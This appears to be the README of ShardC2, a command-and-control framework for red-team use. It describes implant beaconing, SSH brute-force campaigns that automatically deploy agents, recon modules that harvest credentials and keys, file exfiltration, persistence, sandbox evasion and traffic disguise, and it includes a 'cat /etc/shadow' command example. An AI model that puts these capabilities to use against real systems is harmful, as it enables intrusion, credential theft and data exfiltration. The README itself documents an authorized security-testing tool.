# ShardC2

A modular command-and-control framework built in Go for authorized red team operations and security research. ShardC2 manages implants across compromised hosts, orchestrates multi-stage attack campaigns, and provides a real-time operator dashboard — all controlled by safety policies that restrict scope to authorized targets.

<img width="1672" height="941" alt="ShardC2 Dashboard" src="https://github.com/user-attachments/assets/b5498fda-a45c-4e7e-b57a-f0adde39cab0" />

---

## How It Works

ShardC2 operates on a **server → agent → target** model:

1. **Server** runs on your attack infrastructure. It hosts the REST API, campaign engine, operator dashboard, and agent binary distribution.
2. **Agents** are lightweight implants deployed to compromised hosts. They beacon home on a configurable interval, fetch pending commands, execute them, and report results.
3. **Campaigns** are automated multi-step operations (recon, brute force, exfiltration, persistence) that the engine distributes across agents and tracks to completion.

### Attack Chain Example

A typical lateral movement flow:

```
Operator creates BRUTE campaign targeting 10.0.0.0/24
    ↓
Engine generates SSH brute-force tasks (server-side or via agents)
    ↓
Credential found: admin@10.0.0.15:22
    ↓
Engine auto-deploys agent to 10.0.0.15 via SSH
    ↓  (detects arch → downloads correct binary → runs with implant key)
New agent registers, appears in dashboard
    ↓
Operator runs RECON campaign on new agent (privesc, secrets, lateral targets)
    ↓
Discovered SSH keys → next hop targets → repeat
```

### Agent Lifecycle

```
Agent starts → sandbox check → TLS setup → register with C2
    ↓
Beacon loop:
    sleep(interval ± jitter)
    POST /beacon (heartbeat, system info)
    GET  /commands (fetch pending)
    execute commands locally
    POST /result (return output)
    ↓
Kill date reached → self-terminate
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        C2 SERVER                             │
│                                                              │
│  ┌──────────┐  ┌──────────────┐  ┌────────────────────┐    │
│  │ Fiber    │  │  Campaign    │  │   Build Pipeline   │    │
│  │ HTTP/WS  │  │  Engine      │  │   (cross-compile)  │    │
│  │ Server   │  │  (5s tick)   │  │                    │    │
│  └────┬─────┘  └──────┬───────┘  └────────────────────┘    │
│       │               │                                      │
│  ┌────┴─────┐  ┌──────┴───────┐  ┌────────────────────┐    │
│  │ Handlers │  │ Task Gen     │  │  Safety Policy     │    │
│  │ (REST)   │  │ recon/brute/ │  │  (CIDR scope,      │    │
│  │          │  │ exfil/persist│  │   safe mode)       │    │
│  └────┬─────┘  └──────────────┘  └────────────────────┘    │
│       │                                                      │
│  ┌────┴─────┐  ┌──────────────┐  ┌────────────────────┐    │
│  │Middleware│  │  Audit Log   │  │  Malleable         │    │
│  │JWT/HMAC/ │  │              │  │  Profiles          │    │
│  │Payload   │  │              │  │  (path/header mux) │    │
│  └────┬─────┘  └──────────────┘  └────────────────────┘    │
│       │                                                      │
│  ┌────┴──────────────────────────────────────────────┐      │
│  │                  PostgreSQL                        │      │
│  │  bots │ commands │ campaigns │ credentials │ audit │      │
│  └───────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────┘
        ▲                              ▲
        │ HTTPS (TLS)                  │ HTTPS (TLS)
        │ AES-256-GCM payloads         │ JWT auth
        │ HMAC-SHA256 signed           │
        ▼                              ▼
┌──────────────┐              ┌──────────────────┐
│   Agent      │              │  Operator        │
│   (implant)  │              │  Dashboard       │
│              │              │  (SPA + WebSocket)│
│  beacon loop │              │                  │
│  cmd exec    │              │  terminal, files,│
│  persistence │              │  campaigns, creds│
│  evasion     │              │                  │
└──────────────┘              └──────────────────┘
```

### Directory Layout

```
shardc2/
├── cmd/
│   ├── server/          # C2 server entry point (CLI flags, TLS, config)
│   ├── agent/           # Implant entry point (beacon, embedded config)
│   └── bruteforcer/     # Standalone brute force tool
├── internal/
│   ├── server/
│   │   ├── handlers/    # REST API — bots, commands, campaigns, creds, exfil, operators, builds
│   │   ├── middleware/   # Auth (JWT, HMAC, implant key), payload encryption
│   │   ├── engine/      # Campaign engine — recon, brute, exfil, persist, custom task generators
│   │   ├── audit/       # Operator action audit logging
│   │   ├── builds/      # Cross-compile agent build pipeline
│   │   └── report/      # Campaign evidence/report export (Markdown)
│   ├── agent/           # Agent core — beacon loop, sandbox evasion, persistence, SOCKS5 proxy
│   ├── database/        # PostgreSQL connection pool + migration runner
│   └── testutil/        # Test database & HTTP helpers
├── pkg/
│   ├── crypto/          # AES-256-GCM encryption, HMAC-SHA256 signing, XOR string obfuscation
│   ├── policy/          # Safety policy engine — CIDR scope validation, safe mode
│   ├── profiles/        # Malleable C2 profiles — default, CloudFront, WordPress
│   ├── transport/       # Agent-server protocol types (register, beacon, command, result)
│   ├── plugins/         # Plugin manifest loader & validator
│   ├── client/          # Go operator SDK (programmatic C2 access)
│   └── models/          # Shared types — Bot, Command, Campaign, Credential, Build, AuditEvent
├── migrations/          # PostgreSQL schema (001-013)
├── web/dashboard/       # Operator SPA — HTML/CSS/JS with WebSocket real-time updates
├── wordlists/           # Bundled credential wordlists
├── docs/api/            # OpenAPI specification
├── Makefile             # Build, test, deploy, cross-compile targets
├── docker-compose.yml   # PostgreSQL + Redis dev environment
└── policy.json          # Safety policy configuration
```

---

## Setup

### Prerequisites

- **Go 1.21+**
- **Docker & Docker Compose** (for PostgreSQL)
- **Make**

### 1. Start Database

```bash
make docker-up
```

Starts PostgreSQL 15 on port 5432 (user: `shardc2`, password: `shardc2_secret`, db: `shardc2`).

### 2. Generate TLS Certificate

```bash
make generate-cert
```

Creates self-signed `server.crt` and `server.key` (ECDSA P-256, 1 year validity).

### 3. Build Binaries

```bash
make build
```

Produces:
- `bin/shardc2-server` — C2 server
- `bin/shardc2-agent` — implant binary (host architecture)
- `bin/shardc2-brute` — standalone brute forcer

### 4. Start the Server

```bash
./bin/shardc2-server \
  --addr :8443 \
  --tls-cert server.crt \
  --tls-key server.key \
  --implant-key your-implant-key \
  --jwt-secret your-jwt-secret \
  --c2-url https://YOUR_IP:8443 \
  --policy-file policy.json \
  --migrate
```

**Critical flags:**
- `--implant-key` and `--jwt-secret` — set these explicitly. If omitted, the server generates random values on each restart, which invalidates all agent auth and operator JWTs.
- `--c2-url` — your server's externally reachable URL. Required for auto-deploy (agents download their binary from this URL).
- `--migrate` — runs PostgreSQL schema migrations on startup.

The server prints a **bootstrap token** on first run. Save it.

### 5. Create Admin Operator

```bash
curl -sk -X POST \
  -H "Authorization: Bearer <bootstrap-token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"your-password","role":"admin"}' \
  https://localhost:8443/api/v1/operators
```

The bootstrap token is single-use — once an admin exists, it's disabled.

### 6. Deploy an Agent

```bash
./bin/shardc2-agent \
  --server https://YOUR_C2_IP:8443 \
  --implant-key your-implant-key \
  --interval 30s \
  --jitter 5s \
  --insecure-tls-for-lab-only
```

The agent registers with the server, appears in the dashboard, and starts beaconing.

For production, replace `--insecure-tls-for-lab-only` with `--ca-cert your-ca.pem`.

### 7. Access Dashboard

Open `https://YOUR_IP:8443/dashboard/` and log in with your admin credentials.

---

## Dashboard

The operator dashboard is a single-page application with seven sections:

| Section | What it does |
|---------|-------------|
| **Overview** | Real-time stats (active implants, pending commands, campaigns), activity feed, ring charts |
| **Implants** | Full implant list with hostname, IPs, platform, user, privilege level, tags. Click for detail or shell |
| **Terminal** | Interactive shell to any implant. Multi-bot mode sends commands to multiple implants at once. WebSocket for real-time output |
| **Credentials** | Credential vault — categorized secrets (passwords, API keys, tokens, private keys), search/filter, click-to-reveal |
| **Campaigns** | Create/launch/track campaigns. Live progress bars, task results with expandable output, replay completed campaigns, export reports (JSON/HTML/MD) |
| **Files** | Remote file browser — navigate the filesystem of any implant, view permissions/ownership, download files |
| **Settings** | System info, operator management, database stats, agent builder/stager, account settings, audit log |

---

## Campaigns

Campaigns are automated multi-step operations distributed across assigned implants. The campaign engine ticks every 5 seconds, generates tasks, syncs results, and tracks progress.

### Campaign Types

#### Recon — Post-Compromise Enumeration

Runs shell-based reconnaissance modules on compromised hosts. 13 modules available:

| Module | What it collects |
|--------|-----------------|
| `sysinfo` | Hostname, kernel, OS, memory, disk, CPU, virtualization, security posture |
| `network` | Interfaces, routes, DNS, listening ports, connections, ARP, iptables, VPN/tunnels |
| `users` | Current user, logged in users, login history, passwd, shadow, sudoers, group memberships |
| `software` | Security-relevant packages, compilers/dev tools, running services, writable scripts in PATH |
| `cloud` | AWS/GCP/Azure/DO metadata, IAM roles, service account tokens, user-data, local cloud configs |
| `containers` | Docker detection, socket access, running containers, K8s pods/secrets/service accounts |
| `sensitive_files` | Private keys, config files, bash history (password grep), SSH configs, git credentials, world-readable configs |
| `internal_network` | Subnet ping sweep, port scan of live neighbors (22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017, 9200) |
| `privesc` | SUID/SGID binaries, capabilities, sudo NOPASSWD, writable passwd/shadow, docker/lxd group, kernel version, writable PATH |
| `secrets` | SSH private keys (content), history secrets, .env files, DB connection strings, process cmdline secrets, /proc environ, browser creds, GPG keys |
| `lateral_targets` | SSH known_hosts, SSH config hosts, authorized_keys, DB host configs, active connections, NFS/SMB shares, Ansible/Puppet/Salt inventory |
| `persistence_check` | All crontabs, cron dirs, non-default systemd services, rc.local, init.d, profile scripts, LD_PRELOAD, kernel modules, timers, SSHD config |
| `process_inspect` | Process tree, cmdline secrets, listening service details, interesting open files, network sockets, screen/tmux sessions |

**Config:**
```json
{
  "modules": ["sysinfo", "privesc", "secrets", "lateral_targets"]
}
```

#### Brute — SSH Credential Attack

Two modes:

- **Lateral** — distributes brute-force shell scripts across compromised agents (agents attack internal targets)
- **External** — server-side SSH brute force (server directly connects to targets, no bots needed)

On credential discovery, the engine automatically:
1. Stores credentials in the vault
2. SSHs into the target, detects architecture
3. Downloads the correct agent binary (amd64/arm64)
4. Launches the agent with the implant key

**Config:**
```json
{
  "mode": "external",
  "targets": ["10.0.0.0/24", "192.168.1.50"],
  "ports": [22],
  "usernames": ["root", "admin", "ubuntu"],
  "passwords": ["password", "admin123"],
  "use_db_creds": true,
  "workers": 20
}
```

#### Exfil — Data Exfiltration

Searches for and uploads matching files from targets.

**Config:**
```json
{
  "patterns": ["*.pdf", "*.docx", "*.xlsx"],
  "paths": ["/home", "/opt"],
  "max_file_size": "5M"
}
```

#### Persist — Persistence Installation

Deploys persistence mechanisms (cron, systemd, bashrc, rc.local) with randomized filenames and realistic service names.

**Config:**
```json
{
  "methods": ["cron", "systemd", "bashrc"]
}
```

#### Custom — Arbitrary Commands

Execute any shell command across assigned implants.

**Config:**
```json
{
  "command": "cat /etc/shadow"
}
```

---

## Safety Policy

ShardC2 enforces scope restrictions via a JSON policy file. This prevents accidental (or unauthorized) targeting of out-of-scope systems.

```json
{
  "safe_mode": true,
  "allow_external_brute": false,
  "allow_auto_deploy": false,
  "allowed_cidrs": ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"],
  "allowed_hosts": ["lab-target.internal"],
  "blocked_cidrs": ["10.0.0.1/32"]
}
```

| Field | Effect |
|-------|--------|
| `safe_mode` | Pauses all running campaigns on server restart |
| `allow_external_brute` | Permits server-side SSH brute force |
| `allow_auto_deploy` | Permits automatic agent deployment to cracked targets |
| `allowed_cidrs` | Campaign targets must fall within these ranges |
| `allowed_hosts` | Hostnames explicitly permitted as targets |
| `blocked_cidrs` | Targets in these ranges are always rejected (overrides allowed) |

The dashboard shows a **SAFE MODE** banner with active policy restrictions.

---

## Malleable C2 Profiles

Profiles disguise agent traffic as legitimate HTTP services by remapping endpoints, User-Agent strings, and headers.

| Profile | Disguise | Beacon Path | User-Agent |
|---------|----------|-------------|------------|
| `default` | Standard API | `/api/v1/agent/beacon` | Mozilla/5.0 |
| `cloudfront` | Amazon CDN | `/cdn-cgi/analytics` | Amazon CloudFront |
| `wordpress` | WordPress API | `/wp-json/wp/v2/posts` | WordPress/6.4 |

Use `--profile cloudfront` on both server and agent. Custom profiles can be defined as JSON files.

---

## Server Configuration Reference

| Flag | Env Var | Default | Description |
|------|---------|---------|-------------|
| `--addr` | | `:8443` | Listen address |
| `--db` | `SHARDC2_DB` | `postgres://shardc2:shardc2_secret@localhost:5432/shardc2?sslmode=disable` | PostgreSQL DSN |
| `--migrate` | | `false` | Run schema migrations |
| `--bootstrap-token` | `SHARDC2_BOOTSTRAP_TOKEN` | (auto-generated) | Initial admin creation token |
| `--implant-key` | `SHARDC2_IMPLANT_KEY` | (auto-generated) | Agent authentication key |
| `--jwt-secret` | `SHARDC2_JWT_SECRET` | (auto-generated) | JWT signing secret |
| `--payload-key` | `SHARDC2_PAYLOAD_KEY` | | AES-256-GCM payload encryption key (hex, 32 bytes) |
| `--c2-url` | `SHARDC2_C2_URL` | | External URL for agent auto-deploy |
| `--tls-cert` | | | TLS certificate path |
| `--tls-key` | | | TLS private key path |
| `--profile` | | `default` | Malleable C2 profile |
| `--policy-file` | `SHARDC2_POLICY_FILE` | | Safety policy JSON path |

## Agent Configuration Reference

| Flag | Env Var | Default | Description |
|------|---------|---------|-------------|
| `--server` | `SHARDC2_SERVER` | (required) | C2 server URL |
| `--implant-key` | `SHARDC2_IMPLANT_KEY` | (required) | Must match server's key |
| `--payload-key` | `SHARDC2_PAYLOAD_KEY` | | Payload encryption key (must match server) |
| `--interval` | | `5m` | Beacon interval |
| `--jitter` | | `60s` | Max random jitter added to interval |
| `--ca-cert` | | | CA cert for TLS verification |
| `--kill-date` | `SHARDC2_KILL_DATE` | | Auto-terminate date (RFC3339) |
| `--insecure-tls-for-lab-only` | | `false` | Skip TLS verification (lab only) |
| `--profile` | | `default` | Malleable C2 profile (must match server) |
| `--daemon` | | `false` | Suppress banner output |
| `--ignore-sandbox` | | `false` | Skip VM/sandbox detection |

### Building Agents with Embedded Config

```bash
# Single-platform with embedded keys
make agent-deploy SERVER_URL=https://c2.example.com:8443 IMPLANT_KEY=your-key

# Cross-compile for Linux/Windows/macOS (amd64 + arm64)
make cross-compile SERVER_URL=https://c2.example.com:8443 IMPLANT_KEY=your-key

# Obfuscated build with garble
make agent-garble SERVER_URL=https://c2.example.com:8443 IMPLANT_KEY=your-key
```

---

## API Reference

Full OpenAPI spec: [`docs/api/openapi.yaml`](docs/api/openapi.yaml)

### Authentication

- **Operators:** JWT token via `POST /api/v1/auth/login`
- **Agents:** Implant key (registration) + session token (subsequent requests)
- **Payloads:** Optional AES-256-GCM encryption + HMAC-SHA256 signing

### Key Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `POST` | `/api/v1/auth/login` | none | Operator login → JWT |
| `GET` | `/api/v1/stats` | JWT | Server statistics |
| `GET` | `/api/v1/bots` | JWT | List all agents |
| `GET` | `/api/v1/bots/:id` | JWT | Agent detail |
| `DELETE` | `/api/v1/bots/:id` | JWT | Remove agent |
| `POST` | `/api/v1/commands` | JWT | Send command to agent |
| `POST` | `/api/v1/commands/batch` | JWT | Send command to multiple agents |
| `GET` | `/api/v1/commands/history/:bot_id` | JWT | Command history |
| `POST` | `/api/v1/campaigns` | JWT | Create campaign |
| `GET` | `/api/v1/campaigns` | JWT | List campaigns |
| `POST` | `/api/v1/campaigns/:id/launch` | JWT | Launch campaign |
| `GET` | `/api/v1/campaigns/:id/progress` | JWT | Campaign progress |
| `GET` | `/api/v1/campaigns/:id/results` | JWT | Campaign task results |
| `POST` | `/api/v1/campaigns/:id/replay` | JWT | Replay completed campaign |
| `POST` | `/api/v1/campaigns/validate` | JWT | Dry-run validation |
| `GET` | `/api/v1/campaigns/:id/report.md` | JWT | Download campaign report |
| `GET` | `/api/v1/credentials` | JWT | List credentials (masked) |
| `GET` | `/api/v1/credentials/:id/reveal` | JWT | Reveal password (audited) |
| `GET` | `/api/v1/exfil` | JWT | List exfiltrated files |
| `GET` | `/api/v1/exfil/:id` | JWT | Download exfiltrated file |
| `POST` | `/api/v1/builds` | JWT | Request agent build |
| `GET` | `/api/v1/safety/status` | JWT | Policy status |
| `GET` | `/api/v1/agent/binary` | implant/JWT | Download agent binary |
| `POST` | `/api/v1/operators` | JWT (admin) | Create operator |

### Go SDK

```go
import "github.com/shardc2/shardc2/pkg/client"

c := client.New("https://c2.example.com:8443", jwtToken)

bots, _ := c.ListBots()
stats, _ := c.Stats()
result, _ := c.ValidateCampaign(client.ValidateRequest{
    Type:   "brute",
    Config: `{"targets":["10.0.0.0/24"],"mode":"external"}`,
})
```

---

## Database

PostgreSQL with 13 incremental migrations (auto-applied with `--migrate`):

| # | Migration | Tables/Changes |
|---|-----------|---------------|
| 001 | Core schema | bots, commands, credentials, exfil_data, keylog, proxies |
| 002 | Authentication | bot_tokens (session tokens) |
| 003 | Campaign engine | campaigns, campaign_bots, campaign_tasks |
| 004 | Agent hardening | fingerprint dedup, kill_date, performance indexes |
| 005 | Command timeout | commands.timeout column |
| 006 | Operator RBAC | operators table with roles (admin/operator/viewer) |
| 007 | Audit logging | audit_events table |
| 008 | Agent identity | public keys, token expiry |
| 009 | Campaign runs | campaign_runs tracking table |
| 010 | Build pipeline | agent_builds table |
| 011 | Credential dedup | unique constraint on credentials |
| 012 | Credential categories | category/source columns for credential vault |
| 013 | Bot tags | implant tagging support |

---

## Security Model

| Layer | Mechanism |
|-------|-----------|
| **Transport** | TLS (self-signed or CA), explicit cert pinning via `--ca-cert` |
| **Payload** | AES-256-GCM encryption + HMAC-SHA256 signing (optional, enabled with `--payload-key`) |
| **Agent auth** | Implant key for registration, per-agent session token for subsequent requests |
| **Operator auth** | JWT with RBAC (admin, operator, viewer). Bootstrap token for initial setup |
| **Scope control** | Safety policy with CIDR allow/block lists, safe mode |
| **Audit** | All sensitive operator actions logged with username, IP, action, outcome |
| **Agent OpSec** | Sandbox/VM detection, kill date, configurable beacon jitter, malleable profiles |
| **Rate limiting** | Login: 5/min, operator routes: 600/min, agent routes: 60/min |

---

## Development

```bash
make docker-up          # Start PostgreSQL
make build              # Build all binaries
make test               # Run tests with race detector
go vet ./...            # Static analysis
go test -race ./...     # Tests with race detection
```

### Running Tests

```bash
# Unit tests (no database required)
go test ./...

# Integration tests (requires PostgreSQL)
export SHARDC2_TEST_DB="postgres://shardc2:shardc2_secret@localhost:5432/shardc2?sslmode=disable"
go test ./...
```

### Project Stats

- **72 Go source files** across cmd/, pkg/, internal/
- **21 test suites** covering crypto, policy, handlers, middleware, engine, models, client, builds, audit
- **13 database migrations**
- **3 malleable C2 profiles**
- **13 recon modules**, **5 campaign types**

---

## Disclaimer

ShardC2 is built for **authorized security testing, red team engagements, and security research**. Use only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The authors accept no responsibility for misuse.

## License

See [LICENSE](LICENSE) for details.
